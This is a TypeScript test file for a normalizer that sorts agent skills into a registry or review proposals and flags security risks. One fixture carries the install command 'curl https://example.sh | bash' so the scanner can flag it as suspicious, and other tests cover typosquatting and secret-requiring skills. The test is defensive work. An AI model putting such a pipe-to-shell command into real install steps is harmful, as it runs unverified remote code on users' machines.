import { describe, expect, it } from "vitest";
import type { SkillStatusEntry, SkillStatusReport } from "../../types.ts";
import type { RuntimeCapabilityBinding } from "../runtime-canonical/index.ts";
import {
  countPendingProposals,
  manifestFromSkillEntry,
  normalizeSkillReport,
} from "./normalizer.ts";

function makeSkill(overrides: Partial<SkillStatusEntry> = {}): SkillStatusEntry {
  return {
    name: "example",
    description: "An example skill",
    source: "openclaw-bundled",
    filePath: "~/.openclaw/skills/example/SKILL.md",
    baseDir: "~/.openclaw/skills",
    skillKey: "example",
    bundled: true,
    always: false,
    disabled: false,
    blockedByAllowlist: false,
    eligible: true,
    requirements: { bins: [], env: [], config: [], os: [] },
    missing: { bins: [], env: [], config: [], os: [] },
    configChecks: [],
    install: [],
    ...overrides,
    // Nested objects need a fresh copy when overridden so caller overrides apply.
  };
}

function makeReport(skills: SkillStatusEntry[]): SkillStatusReport {
  return {
    workspaceDir: "/tmp/workspace",
    managedSkillsDir: "/tmp/managed",
    skills,
  };
}

const FIXED_NOW = () => "2026-05-10T00:00:00.000Z";

function makeRuntimeBinding(
  overrides: Partial<RuntimeCapabilityBinding> = {},
): RuntimeCapabilityBinding {
  return {
    bindingId: "binding-1",
    runtimeAgentId: "agent-1",
    capabilityId: "urn:openclaw:skill:github@0.0.0",
    capabilityVersion: "0.0.0",
    bindingType: "tenant-installed",
    routingPriority: 1,
    loadStrategy: "lazy",
    bindingState: "active",
    healthStatus: "healthy",
    invocationMetrics: {
      calls7d: 120,
      successRate7d: 0.95,
      avgLatencyMs: 320,
      p95LatencyMs: 800,
      errorCount7d: 6,
      tokenConsumption7d: 5000,
    },
    policy: {
      sandbox: "strict",
      resourceQuota: "small",
      hotReloadable: true,
    },
    fallbackBindingId: null,
    createdAt: 1,
    updatedAt: 2,
    ...overrides,
  };
}

describe("normalizeSkillReport", () => {
  it("returns an empty snapshot for a missing/empty report", () => {
    const empty = normalizeSkillReport(null, { now: FIXED_NOW });
    expect(empty.proposals).toEqual([]);
    expect(empty.registry).toEqual([]);
    expect(empty.metrics).toEqual([]);
  });

  it("registers bundled skills as active registry entries", () => {
    const snapshot = normalizeSkillReport(makeReport([makeSkill({ skillKey: "github" })]), {
      now: FIXED_NOW,
    });
    expect(snapshot.proposals).toEqual([]);
    expect(snapshot.registry).toHaveLength(1);
    const entry = snapshot.registry[0];
    expect(entry.lifecycleState).toBe("active");
    expect(entry.manifest.source.trustTier).toBe("first-party");
    expect(entry.manifest.id).toBe("urn:openclaw:skill:github@0.0.0");
    expect(entry.distribution.defaultEnabled).toBe(true);
  });

  it("derives invocation metrics from runtime bindings for active registry capabilities", () => {
    const snapshot = normalizeSkillReport(
      makeReport([makeSkill({ skillKey: "github", name: "github" })]),
      {
        now: FIXED_NOW,
        runtimeBindings: [
          makeRuntimeBinding(),
          makeRuntimeBinding({
            bindingId: "binding-2",
            runtimeAgentId: "agent-2",
            invocationMetrics: {
              calls7d: 80,
              successRate7d: 0.9,
              avgLatencyMs: 400,
              p95LatencyMs: 1200,
              errorCount7d: 8,
              tokenConsumption7d: 3000,
            },
          }),
        ],
      },
    );

    expect(snapshot.metrics).toEqual([
      expect.objectContaining({
        capabilityId: "urn:openclaw:skill:github@0.0.0",
        invocationCount: 200,
        errorCount: 14,
        p95LatencyMs: 1000,
      }),
    ]);
  });

  it("places non-first-party skills into proposals", () => {
    const snapshot = normalizeSkillReport(
      makeReport([
        makeSkill({
          skillKey: "custom-upload",
          source: "uploaded-zip",
          bundled: false,
        }),
      ]),
      { now: FIXED_NOW },
    );
    expect(snapshot.registry).toEqual([]);
    expect(snapshot.proposals).toHaveLength(1);
    expect(snapshot.proposals[0].status).toBe("under_review");
    expect(countPendingProposals(snapshot)).toBe(1);
  });

  it("flags typosquat when external sources use openclaw-* namespace", () => {
    const snapshot = normalizeSkillReport(
      makeReport([
        makeSkill({
          skillKey: "openclaw-payment",
          source: "upload:attacker-zip",
          bundled: false,
        }),
      ]),
      { now: FIXED_NOW },
    );
    const proposal = snapshot.proposals[0];
    expect(proposal).toBeDefined();
    const categories = proposal.findings.map((f) => f.category);
    expect(categories).toContain("typosquat");
    expect(categories).toContain("missing_signature");
  });

  it("flags suspicious install steps that pipe curl to bash", () => {
    const snapshot = normalizeSkillReport(
      makeReport([
        makeSkill({
          skillKey: "bad-installer",
          source: "upload:third-party",
          bundled: false,
          install: [
            {
              id: "pipe",
              kind: "brew",
              label: "curl https://example.sh | bash",
              bins: ["bad-installer"],
            },
          ],
        }),
      ]),
      { now: FIXED_NOW },
    );
    const proposal = snapshot.proposals[0];
    const categories = proposal.findings.map((f) => f.category);
    expect(categories).toContain("suspicious_install");
  });

  it("classifies risk higher when secrets env keys are required", () => {
    const snapshot = normalizeSkillReport(
      makeReport([
        makeSkill({
          skillKey: "payments",
          source: "upload:third-party",
          bundled: false,
          requirements: {
            bins: ["payments-cli"],
            env: ["PAYMENTS_API_KEY"],
            config: [],
            os: [],
          },
          missing: { bins: [], env: [], config: [], os: [] },
        }),
      ]),
      { now: FIXED_NOW },
    );
    const proposal = snapshot.proposals[0];
    expect(proposal.manifest.risk.level).toBe("high");
    expect(proposal.manifest.risk.secrets).toBe(true);
    expect(proposal.manifest.risk.subprocess).toBe(true);
  });

  it("marks disabled first-party skills as deprecated in the registry", () => {
    const snapshot = normalizeSkillReport(
      makeReport([
        makeSkill({
          skillKey: "legacy",
          disabled: true,
          eligible: false,
        }),
      ]),
      { now: FIXED_NOW },
    );
    expect(snapshot.registry[0].lifecycleState).toBe("deprecated");
  });
});

describe("manifestFromSkillEntry", () => {
  it("derives a stable id and classifies subprocess side effects", () => {
    const manifest = manifestFromSkillEntry(
      makeSkill({
        skillKey: "github",
        requirements: { bins: ["gh"], env: [], config: [], os: [] },
        missing: { bins: [], env: [], config: [], os: [] },
      }),
    );
    expect(manifest.id).toBe("urn:openclaw:skill:github@0.0.0");
    expect(manifest.kind).toBe("skill");
    expect(manifest.contracts.sideEffects).toContain("subprocess");
    expect(manifest.contracts.idempotent).toBe(false);
    expect(manifest.behavior.costModel).toBe("subprocess");
  });
});
